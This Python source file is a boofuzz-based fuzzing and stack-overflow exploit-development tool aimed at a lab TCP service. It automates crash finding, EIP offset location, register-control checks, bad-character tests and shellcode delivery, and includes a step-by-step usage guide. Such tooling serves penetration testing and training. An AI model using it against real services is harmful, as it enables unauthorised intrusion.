#!/usr/bin/env python3
from __future__ import annotations
from argparse import (
    Namespace as Options,
    ArgumentParser as Parser
)
from typing import (
    TypeVar,
    Generic,
    Union,
    Callable,
    Any,
    Annotated,
    Generator
)
from string import (
    ascii_uppercase,
    ascii_lowercase,
    digits
)
from struct import (
    pack,
    unpack
)
from sys import (
    stdout,
    stderr
)
from socket import (
    socket,
    AF_INET,
    SOCK_STREAM
)
from binascii import (
    unhexlify,
    hexlify
)
from threading import Event
from typing.io import IO
from boofuzz import *


""" Generic type definitions """


# Generic exception type
_E = TypeVar("_E", bound=Union[Exception, object, str])
# Generic byte-string type
_B = TypeVar("_B", bound=Union[str, bytes, list, None])
# Generic char-byte type
_C = TypeVar("_C", bound=Union[str, bytes, int, None])
# Generic socket-session type
_S = TypeVar("_S", bound=Union[Session, socket, None])


# noinspection PyMethodMayBeStatic,SpellCheckingInspection
class Fuzzer(Generic[_S, _E, _B, _C]):
    """ Description:

    (i) Fuzzing class for TCP-based services for memory corruption vulnerabilities

    A. Implementations include:
        1. TCP fuzzing via boofuzz
        2. Crash confirmation via overflow
        3. Unique byte pattern creation
        4. Locating offset via pattern
        5. Confirmation of control
        6. Identifying space available
        7. Identifying bad characters
        8. Shellcode execution         
    """

    # Usage with hints
    usage: str = """\n
    
    * Fuzzing & Debugging Tips *
     
        (i) Linux debugging with GDB:
         gdb -q --pid $(pgrep lin-server) --eval-command 'set follow-fork-mode child';

        (i) Windows debugging with CDB:
         cdb -pn win-server.exe -pd -c "g"
        
        (i) Set windbg as post mortem debugger:
         windbg.exe -I 
    
        (i) Fuzzing input parameter explained:     
         Format: -i (1)<parameter> (2)<value> (3)delimiter (4)fuzzValue (5)fuzzDel
         (1)<The parameter value or second argument> 
         (2)<The delimiter between parameter name and value>
         (3)<Enable fuzzing the value or second argument>
         (4)<Enable fuzzing the delimiter>

    * Fuzzing Process & Examples * 
    
        (1) Fuzz the target to trigger a crash 
         (i) Example using three parameters:
            python fuzz-server.py --fuzz \\
             -d fuzz_db -l fuzz_log \\
             -t 172.31.24.110 -p 65534 \\
             -i "FUZZ" "FUZZ" "" true false \\
             -i "time" "FUZZ" "" false false \\
             -i "debug" "FUZZ" "" false false    
         
         (i) Example skipping 19 test cases starting at 20:
            python fuzz-server.py --fuzz \\
             -d fuzz_db -l fuzz_log --skip 20 \\
             -t 172.31.24.110 -p 65534 \\
             -i "FUZZ" "FUZZ" "" true false \\
                          
        (2) Hex encode the command that crashed the target
          (i) Example of encoding the "debug" command to "6465627567":  
            python fuzz-server.py -th debug
            
        (3) Confirm crash using random pattern of n length
          (i) Example of prepending the "debug" command, generating random pattern of 2000 bytes:
            python fuzz-server.py --confirm \\
            -t 172.31.24.110 -p 65534 \\
            -pre 6465627567 -gp -s 2000
        
        (4) Decode the pattern from overwritten register(s)
          (i) Example of decoding the EIP value of "79413279" to "yA2y":
            python fuzz-server.py -fh 79413279
                
        (5) Locate the offset from the pattern of the overwritten register
          (i) Example of searching the 2000 byte pattern to find the offset 727 of ""yA2y":
              Note: This doesn't include the size of the prepended "debug" bytes!    
            python fuzz-server.py -find -o yA2y \\
            -s 2000 --confirm
        
        (6) Confirm control over registers
          (i) Example of sending "debug" plus 727 bytes of CC padding, followed by AAAAAAAA for the EIP, etc:    
            python fuzz-server.py --confirm \\
            -t 172.31.24.110 -p 65534 \\
            -pre 6465627567 -pad CC -s 727 \\
            -a AAAAAAAA -a BBBBBBBB
            
        (7) Confirm space for shellcode and/or bad characters
          (i) Example of crashing the target with 727 bytes of NOPs plus bytes between 00-FF, excluding 00, 0A, and 0D:
            python fuzz-server.py --confirm \\
            -t 172.31.24.110 -p 65534 -gc \\
            -pre 6465627567 -pad 90 -s 727 -b 000A0D  
            
        (8) Confirm execution of code using NOP padding and hex shellcode
          (i) Example of testing shellcode and prepending 16-NOPs to the payload:
            python fuzz-server.py --confirm \\
            -t 172.31.24.110 -p 65534 \\
            -pad 90 -s 16 -c DEADBEEF...DEADBEEF    
    \n"""

    def __init__(self: Fuzzer, opts: Options, **kw):
        """ Instance initializer
        :param opts: Namespace object containing instance attributes
        :param kw: Arbitrary keyword argument dictionaries
        """
        self.event: Event = Event()
        self.sock: _S = socket(AF_INET, SOCK_STREAM)
        self.buffSize: int = 4
        self.target: str = "172.31.24.110"
        self.port: int = 65534
        self.session: _S = None
        self.restarts: list = []
        self.dbName: str = "fuzz"
        self.logName: str = "fuzz"
        self.skipCases: int = 0
        self.set(**opts.__dict__).set(**kw)

    """ Internal Fuzzing Classes """

    class EventCapture(object):
        """ Event capture callback object
        """
        def __init__(self, *ag, **kw):
            """ Event capture initializer method
            :param ag: Arbitrary argument lists
            :param kw: Arbitrary keyword argument dictionaries
            """
            self.params: list = ag
            self.__dict__.update(**kw)

    class RestartEvent(EventHook):
        """ Restart event hook class
        """
        def __init__(self, callback: Callable, **kw):
            """ Restart event initializer method
            :param callback: Callable hook callback
            :param kw: Arbitrary keyword argument dictionaries
            """
            EventHook.__init__(self)
            self.__handlers = [callback]
            self.__dict__.update(**kw)

    """ Properties """

    @property
    def shellcode(self: Fuzzer) -> Annotated[bytes, """
        Shellcode bytes
    """]:
        """ Hex-decode shellcode
        :return: Bytes of shellcode
        """
        return unhexlify(self.get("code", ""))

    @property
    def remaining(self: Fuzzer) -> Annotated[int, """
        Remaining iterations
    """]:
        """ Length of remaining interations
        :return: Integer length value
        """
        left = 0
        try:
            left = len(self.get("input", []))
        except Exception as err:
            self.logError(f"remaining: {err}")
        return left

    @property
    def logFile(self: Fuzzer) -> Annotated[IO, """
        Logfile handle in append mode
    """]:
        """ Obtain file handle for appending to fuzzer log
        :return: Logfile handle IO
        """
        return open(f"{self.logName}-{self.target}.log", "a+")

    @property
    def database(self: Fuzzer) -> Annotated[str, """
        Fuzzing database name
    """]:
        """ Name of fuzzing database
        :return: String name value
        """
        return f"{self.logName}-{self.target}.db"
    
    @property
    def stopped(self: Fuzzer) -> Annotated[bool, """
        Check if fuzzer is stopped
    """]:
        """ Check if fuzzing stop event has been set
        :return: Boolean result
        """
        return self.event.is_set()

    """ Common Methods """

    def get(self: Fuzzer, key: str, *ag, **kw) -> Annotated[Any, """
        Attribute accessor method
    """]:
        """ Get instance attribute by key
        :param key: String key of attribute
        :param ag: Arbitrary argument lists
        :param kw: Arbitrary keyword argument dictionaries
        :return: Attribute value of any type
        """
        return self.__dict__.get(key, *ag, **kw)

    def set(self: Fuzzer, **kw) -> Annotated[Fuzzer, """
        Attribute mutator method
    """]:
        """ Set instance attribute values by key-pair
        :param kw: Arbitrary keyword argument dictionaries
        :return: Instance for fluent design patterns
        """
        self.__dict__.update(**kw)
        return self

    def fromHex(self: Fuzzer, value: _B) -> Annotated[bytes, """
        Hex-decode value to bytes
    """]:
        """ Hex-decode string or bytes value
        :param value: String or bytes value
        :return: Bytes of value
        """
        try:
            return unhexlify(self.toString(value).strip())
        except Exception as err:
            self.logError(f"fromHex: {err}")
            return b""

    @staticmethod
    def toString(value: _B) -> Annotated[str, """
        Cast value to string
    """]:
        """ Convert value to string
        :param value: String or bytes value
        :return: String value
        """
        return value.decode() if isinstance(value, bytes) else value

    @staticmethod
    def toBytes(value: _B) -> Annotated[bytes, """
        Cast value to bytes
    """]:
        """ Convert value to bytes
        :param value: String or bytes value
        :return: Bytes value
        """
        return value if isinstance(value, bytes) else value.encode()

    def fromHexArray(self, values: list) -> bytes:
        return b"".join([self.fromHex(value) for value in values])

    @staticmethod
    def pack(address: int) -> Annotated[bytes, """
        Pack integer to unsigned long in little endian bytes format
    """]:
        """ Cast DWORD integer to little endian bytes
        :param address: Integer of DWORD address
        :return: Bytes in little endian
        """
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> Annotated[int, """
        Unpack little endian bytes to big endian unsigned long integer
    """]:
        """ Cast little endian bytes to DWORD integer
        :param address: Bytes of unsigned long address
        :return: Integer value
        """
        return unpack(">L", address)[0]

    """ Confirmation Methods """

    @staticmethod
    def pattern() -> Annotated[Generator[str], """
        Generate alphanumeric ASCII string pattern
    """]:
        """ Generate unique uppercase, lowercase, and number patterns
        :return: String generator
        """
        for x in ascii_uppercase:
            for y in ascii_lowercase:
                for z in digits:
                    yield f"{x}{y}{z}"

    def generatePattern(self: Fuzzer, size: int) -> Annotated[bytes, """
        Generate alphanumeric ASCII byte pattern of given size
    """]:
        """ Generate bytes pattern of given size
        :param size: Integer size of pattern to create
        :return: Bytes of pattern created
        """
        data: list[bytes] = []
        [
            data.append(char.encode())
            for char in self.pattern()
            if len(b"".join(data)) < size
        ]
        return b"".join(data[:size])

    def generateChars(self: Fuzzer, exclude: _C = b"") -> Annotated[bytes, """
        Generate character array of 0x00-0xff with optional exclusions
    """]:
        """ Generate char values between 0x00-0xff with optional exclusions
        :param exclude: Optional byte exclusions
        :return: Bytes of chars generated
        """
        exclude = list(
            bytes(list([exclude])) if isinstance(exclude, int)
            else self.toBytes(exclude)
        )
        return bytes([
            idx for idx in range(0x100) if idx not in exclude
        ])

    def findOffset(self: Fuzzer, key: str, size: int) -> Annotated[str, """
        Locate index of pattern string for a given size
    """]:
        """ Search unique pattern of given size for string key
        :param key: String key to search for
        :param size: Integer size of pattern to search
        :return: String result
        """
        pattern = self.generatePattern(size).decode("ascii")
        key = key.strip().encode().decode("ascii")
        result = pattern.find(key)
        if result < 0:
            key = list(key)
            key.reverse()
            key = "".join(key)
            result = pattern.find(key)
        return (
            f"{key} located at {result}" if result >= 0
            else f"Failed to locate {key}"
        )

    @staticmethod
    def getPadding(size: int, byte: _B = 0x90) -> Annotated[bytes, """
        Generate byte paddding of a given size
    """]:
        """ Create array of repeated bytes limited by size
        :param size: Integer size to limit padding
        :param byte: Byte to use for padding
        :return: Bytes of padding
        """
        return bytes([byte[0] if isinstance(byte, bytes) else byte]) * size

    @staticmethod
    def toHexAddress(data: int, right: bool = False) -> Annotated[str, """
        Convert integer value to hex-encoded address
    """]:
        """ Cast DWORD integer to the hex representation
        :param data: Integer DWORD value
        :param right: Boolean option to pad left or right
        :return: String hex address
        """
        address = hex(data).lstrip("0x")
        return (
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )

    def toAddress(self: Fuzzer, data: _B, right: bool = False) -> Annotated[int, """
        Cast bytes to unsigned long integer 
    """]:
        """ Cast bytes to integer DWORD address
        :param data: Bytes to convert
        :param right: Boolean option to pad left or right
        :return: Integer value of address
        """
        address = self.toString(data).strip()
        address = str(
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )
        return self.unpack(unhexlify(address))

    def connect(self: Fuzzer) -> Annotated[Fuzzer, """
        Establish TCP connection to target
    """]:
        """ Connect to target on specified TCP port
        :return: Instance for fluent design patterns
        """
        try:
            self.sock: socket = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.target, self.port))
        except Exception as err:
            raise Exception(f"Connect error: {err}")
        return self

    def send(self: Fuzzer, buffer: bytes) -> Annotated[Fuzzer, """
        Send bytes to target via TCP socket
    """]:
        """ Send buffer of bytes through connected socket
        :param buffer: Bytes to send
        :return: Instance for fluent design patterns
        """
        try:
            self.sock.send(buffer)
        except Exception as err:
            raise Exception(f"Send error: {err}")
        return self

    def recv(self: Fuzzer, size: int) -> Annotated[bytes, """
        Receive buffer of given size from socket
    """]:
        """ Receive bytes from socket using size provided
        :param size: Integer size of bytes to receive
        :return: Bytes received
        """
        try:
            return self.sock.recv(size)
        except Exception as err:
            raise Exception(f"Receive error: {err}")

    def close(self: Fuzzer) -> Annotated[Fuzzer, """
        Terminate socket connection
    """]:
        """ Close connected TCP socket
        :return: Instance for fluent design patterns
        """
        try:
            self.sock.close()
        except Exception as err:
            print(f"Close error: {err}")
        return self

    def recvUntil(self: Fuzzer, flag: bytes) -> Annotated[bytes, """
        Receive bytes until pattern matched
    """]:
        """ Continue to receive bytes until flag matched
        :param flag: Bytes of pattern to match
        :return: Bytes received
        """
        data: bytes = bytes()
        while True:
            try:
                data += self.recv(self.buffSize)
                if flag in data:
                    break
            except Exception as er:
                print(f"Recieve error: {er}")
                break
        return data

    def confirmCrash(self: Fuzzer) -> Annotated[Fuzzer, """
        Confirm ability to consistently crash target
    """]:
        """ Automate the process to crash target to confirm overflow
        :return: Instance for fluent design patterns
        """
        try:
            if self.get("genPattern"):
                self.logInfo(f"Confirming crash pattern size: {self.get('size')}")
                payload = self.fromHexArray(self.get("prependBytes"))
                payload += self.generatePattern(self.get("size"))
                payload += self.fromHexArray(self.get("addBytes"))
                self.logInfo(f"Confirming crash")
                return self.send(payload)
        except Exception as err:
            self.logError(f"confirmCrash: {err}")
        return self

    def confirmCharsSpace(self: Fuzzer) -> Annotated[Fuzzer, """
        Confirm available space after crashing target
    """]:
        """ Automate the process of crashing target to identify space available
        :return: Instance for fluent design patterns
        """
        try:
            if self.get("genChars"):
                self.logInfo(f"Generating character sequence")
                payload = self.fromHexArray(self.get("prependBytes"))
                payload += self.getPadding(
                    self.get("size"),
                    self.fromHex(self.get("paddingChar"))
                )
                payload += self.generateChars(self.fromHex(self.get("exclude")))
                payload += self.fromHexArray(self.get("addBytes"))
                self.logInfo(f"Confirming characters excluding {self.get('exclude')}")
                return self.send(payload)
        except Exception as err:
            self.logError(f"confirmCharsSpace: {err}")
        return self

    def confirmControl(self: Fuzzer) -> Annotated[Fuzzer, """
        Crash target to confirm EIP control
    """]:
        """ Automate the process to crash target for confirmation of EIP control
        :return: Instance for fluent design patterns
        """
        try:
            self.logInfo(f"Generating payload")
            payload = self.fromHexArray(self.get("prependBytes"))
            payload += self.getPadding(
                self.get("size"),
                self.fromHex(self.get("paddingChar"))
            )
            payload += self.fromHex(self.get("code"))
            payload += self.fromHexArray(self.get("addBytes"))
            self.logInfo(f"Confirming control with {''.join(self.get('addBytes'))}")
            self.send(payload)
        except Exception as err:
            self.logError(f"confirmControl: {err}")
        return self

    def confirmFuzz(self: Fuzzer) -> Annotated[Fuzzer, """
        Fuzzing confirmation method
    """]:
        """ Main method for fuzzing confirmation
        :return: Instance for fluent design patterns
        """
        self.logInfo(f"Confirming fuzzed target: {self.target}:{self.port}")
        try:
            if self.get("searchOffset"):
                return self.logInfo(
                    self.findOffset(
                        self.get("offset"),
                        self.get("size")
                    )
                )
            self.logInfo(f"Connecting to target").connect()
            if self.get("genPattern"):
                self.confirmCrash()
            elif self.get("genChars"):
                self.confirmCharsSpace()
            else:
                self.confirmControl()
            self.logInfo(f"Disconnecting from target").close()
        except Exception as err:
            self.logError(f"confirmFuzz: {err}")
        return self

    """ Fuzzing Methods """

    def stop(self: Fuzzer) -> Annotated[Fuzzer, """
        Terminate fuzzing session
    """]:
        """ Set event flag to terminate fuzzing session
        :return: Instance for fluent design patterns
        """
        if not self.stopped:
            self.logInfo(f"Stopping session.").event.set()
        return self    

    def logOutput(self: Fuzzer, message: _E, error: bool = False) -> Annotated[Fuzzer, """
        Log fuzzing output
    """]:
        """ Log output to stdout and append to logfile
        :param message: Exception or string message value
        :param error: Boolean value of error or string
        :return: Instance for fluent design patterns
        """
        (stderr if error else stdout).write(f"{message}\n")
        self.logFile.write(f"{message}\n")
        return self

    def logError(self: Fuzzer, message: _E) -> Annotated[Fuzzer, """
        Log exception 
    """]:
        """ Log exception to stdout
        :param message: Exception message value
        :return: Instance for fluent design patterns
        """
        return self.logOutput(
            f"[!] ERROR: {type(self).__name__}.{message}",
            True
        )

    def logInfo(self: Fuzzer, message: _E) -> Annotated[Fuzzer, """
        Log informational message
    """]:
        """ Log informational message to stdout
        :param message: String or exception message
        :return: Instance for fluent design patterns
        """
        return self.logOutput(
            f"[i] INFO: {message}"
        )

    def restartCallback(self: Fuzzer, *ag, **kw) -> Annotated[bool, """
        Function callback for fuzzing restart event
    """]:
        """ Callback function for restart event
        :param ag: Arbitrary argument lists
        :param kw: Arbitrary keyword argument dictionaries
        :return: Boolean result
        """
        self.restarts.append(Fuzzer.EventCapture(*ag, **kw))
        self.logInfo(f"Callback received: {len(self.restarts)}")
        return False

    def getSession(self: Fuzzer, index: int = 0, **kw) -> Annotated[Fuzzer, """
        Initialize fuzzing session
    """]:
        """ Initialize boofuzz session at optional test index
        :param index: Integer of test index
        :param kw: Arbitrary keyword argument dictionaries
        :return: Instance for fluent design patterns
        """
        try:
            self.logInfo(f"Initializing session.")
            self.session = Session(
                ignore_connection_issues_when_sending_fuzz_data=False,
                check_data_received_each_request=True,
                restart_callbacks=[self.restartCallback],
                ignore_connection_aborted=False,
                reuse_target_connection=False,
                ignore_connection_reset=False,
                receive_data_after_fuzz=True,
                crash_threshold_request=1,
                db_filename=self.database,
                restart_threshold=1,
                index_start=index,
                fuzz_loggers=[
                    FuzzLoggerText(file_handle=self.logFile),
                    FuzzLoggerText(file_handle=stdout),
                ],
                target=Target(
                    connection=TCPSocketConnection(
                        self.target,
                        self.port
                    )
                ),
                **kw
            )
            self.session.on_failure = Fuzzer.RestartEvent(
                callback=self.restartCallback
            )
            self.logInfo(f"Session initialized.")
        except Exception as err:
            self.logError(f"getSession: {err}").stop()
        return self

    def startFuzz(
        self: Fuzzer,
        parameter: str = "FUZZ",
        value: str = "FUZZ",
        delimiter: str = "",
        fuzzValue: bool = False,
        fuzzDelimiter: bool = False,
        **kw
    ) -> Annotated[Fuzzer, """ Begin fuzzing session """]:
        """ Start boofuzz session with given settings
        :param parameter: String parameter name to fuzz
        :param value: String value name to fuzz
        :param delimiter: String delimiter to fuzz
        :param fuzzValue: Boolean indicator to fuzz value
        :param fuzzDelimiter: Boolean indicator to fuzz delimiter
        :param kw: Arbitrary keyword argument dictionaries
        :return: Instance for fluent design patterns
        """
        self.logInfo(f"Starting fuzz: {parameter} {value} {delimiter}")
        try:
            self.getSession(index=self.skipCases, **kw)
            s_initialize(parameter)
            s_string(parameter, fuzzable=fuzzValue)
            s_delim(delimiter, fuzzable=fuzzDelimiter)
            s_string(value, fuzzable=True)
            self.session.connect(s_get(parameter))
            self.session.fuzz()
        except Exception as err:
            self.logError(f"startFuzz: {err}")
        return self

    def fuzzNext(self: Fuzzer) -> Annotated[tuple, """
        Obtain next fuzzing parameters
    """]:
        """ Retrieve next parameters in tuple format
        :return: Tuple containing fuzzing parameters
        """
        nextFuzz: tuple = ()
        try:
            if not bool(self.remaining):
                self.stop()
                return nextFuzz
            ag: tuple = self.get("input", []).pop(0)
            nextFuzz = (
                str(ag[0]), str(ag[1]), str(ag[2]),
                bool(str(ag[3]) == "true"),
                bool(str(ag[4]) == "true")
            )
        except Exception as err:
            self.logError(f"fuzzNext: {err}")
            self.stop()
        return nextFuzz

    def fuzz(self: Fuzzer, **kw) -> Annotated[Fuzzer, """
        Main method to begin fuzzing process
    """]:
        """ Main method to kick off fuzzing process
        :param kw: Arbitrary keyword argument dictionaries
        :return: Instance for fluent design patterns
        """
        self.logInfo(f"Fuzzing target: {self.target}:{self.port}")
        while not self.stopped:
            try:
                self.startFuzz(*self.fuzzNext(), **kw)
            except KeyboardInterrupt:
                self.logInfo(f"Exit requested.")
                break
            except Exception as err:
                self.logError(f"startFuzz: {err}")
                break
            finally:
                if not bool(self.remaining):
                    self.stop()
                    break
        self.logInfo(f"Fuzzing complete.")
        input("Press any key to exit.")
        return self

    """ Entry Point """

    @staticmethod
    def main(**kw) -> Annotated[Fuzzer, """
        Static main entry point
    """]:
        """ Static entry point method to instantiate fuzzing instance
        :param kw: Arbitrary keyword argument dictionaries
        :return: Fuzzing instance
        """
        # Fuzzing parameters
        opts: Parser = Parser(
            description="** Fuzzing template for TCP/IP based applications **"
        )
        opts.add_argument(
            '-hints', '--hints',
            dest='hints',
            default=False,
            action='store_true',
            required=False,
            help='Display hints and tips'
        )
        opts.add_argument(
            '--fuzz',
            dest='fuzzTarget',
            default=False,
            action='store_true',
            required=False,
            help='Fuzz target over TCP/IP'
        )
        opts.add_argument(
            '--confirm',
            default=False,
            action='store_true',
            required=False,
            help='Confirm crash, control, space, bad-characters, or execution'
        )
        opts.add_argument(
            '-t', '--target',
            dest='target',
            default='172.31.24.110',
            type=str,
            required=False,
            help='Target IP address to connect to'
        )
        opts.add_argument(
            '-p', '--port',
            dest='port',
            default=65534,
            type=int,
            required=False,
            help='Target port to connect to'
        )
        opts.add_argument(
            '-l', '--logfile',
            dest='logName',
            default='fuzz',
            type=str,
            required=False,
            help='Logfile base name to log output'
        )
        opts.add_argument(
            '-d', '--database',
            dest='dbName',
            default='fuzz',
            type=str,
            required=False,
            help='Database base file name to log output'
        )
        opts.add_argument(
            '-i', '--input',
            dest='input',
            required=False,
            action='append',
            nargs=5,
            metavar=(
                'parameter',
                'value',
                'delimiter',
                'fuzzValue',
                'fuzzDelimiter'
            ),
            help='Input parameters for fuzzing'
        )
        # Confirmation parameters
        opts.add_argument(
            '-th', '--to-hex',
            dest='strToHex',
            default="",
            type=str,
            required=False,
            help='Convert a string to a hex and display the output'
        )
        opts.add_argument(
            '-fh', '--from-hex',
            dest='strFromHex',
            default="",
            type=str,
            required=False,
            help='Convert a string to from hex and display the output'
        )
        opts.add_argument(
            '-s', '--size',
            dest='size',
            default=0,
            type=int,
            required=False,
            help='Length of pattern to generate when confirming crash'
        )
        opts.add_argument(
            '-c', '--code',
            dest='code',
            default="",
            type=str,
            required=False,
            help='Hex encoded shellcode to send for confirmation'
        )
        opts.add_argument(
            '-a', '--append-bytes',
            dest='addBytes',
            default=[""],
            required=False,
            action='append',
            help='Hex encoded byte-code to append to shellcode or padding'
        )
        opts.add_argument(
            '-pre', '--prepend-bytes',
            dest='prependBytes',
            default=[""],
            required=False,
            action='append',
            help='Hex encoded byte-code to prepend to shellcode or padding'
        )
        opts.add_argument(
            '-o', '--offset-pattern',
            dest='offset',
            default="",
            type=str,
            required=False,
            help='Pattern to search to for when searching for pattern offset'
        )
        opts.add_argument(
            '-b', '--bad-bytes',
            dest='exclude',
            default="",
            type=str,
            required=False,
            help='Hex encoded bytes to exclude from byte code for bad-char confirmation'
        )
        opts.add_argument(
            '-pad', '--padding',
            dest='paddingChar',
            default="",
            type=str,
            required=False,
            help='Hex encoded byte to prepend as padding characters'
        )
        # Confirmation action parameters
        opts.add_argument(
            '-find', '--find-offset',
            dest='searchOffset',
            default=False,
            action='store_true',
            required=False,
            help='Search for offset based on pattern size sent during crash confirmation'
        )
        opts.add_argument(
            '-gp', '--generate-pattern',
            dest='genPattern',
            default=False,
            action='store_true',
            required=False,
            help='Generate and send byte pattern to target for crash confirmation'
        )
        opts.add_argument(
            '-gc', '--generate-chars',
            dest='genChars',
            default=False,
            action='store_true',
            required=False,
            help='Generate and append byte sequence 00-FF to confirm bad characters'
        )
        opts.add_argument(
            '-skip', '--skip',
            dest='skipCases',
            type=int,
            default=0,
            action='store',
            required=False,
            help='Skip number of test cases for follow on fuzzing'
        )
        opts: Options = opts.parse_args()
        fuzzer = Fuzzer(opts, **kw)
        if opts.fuzzTarget or opts.confirm:
            return fuzzer.fuzz() if opts.fuzzTarget else fuzzer.confirmFuzz()
        if not (opts.fuzzTarget or opts.confirm):
            if opts.hints:
                fuzzer.logOutput(fuzzer.usage)
            elif opts.strToHex:
                fuzzer.logOutput(fuzzer.toString(
                    hexlify(opts.strToHex.encode())
                ))
            elif opts.strFromHex:
                fuzzer.logOutput(fuzzer.toString(
                    unhexlify(opts.strFromHex.encode())
                ))
        return fuzzer


def main() -> Annotated[None, """
    Main procedural function outside of fuzzing class
"""]:
    """ Call static main method of fuzzing class
    :return:
    """
    Fuzzer.main()


if __name__ == "__main__":
    main()
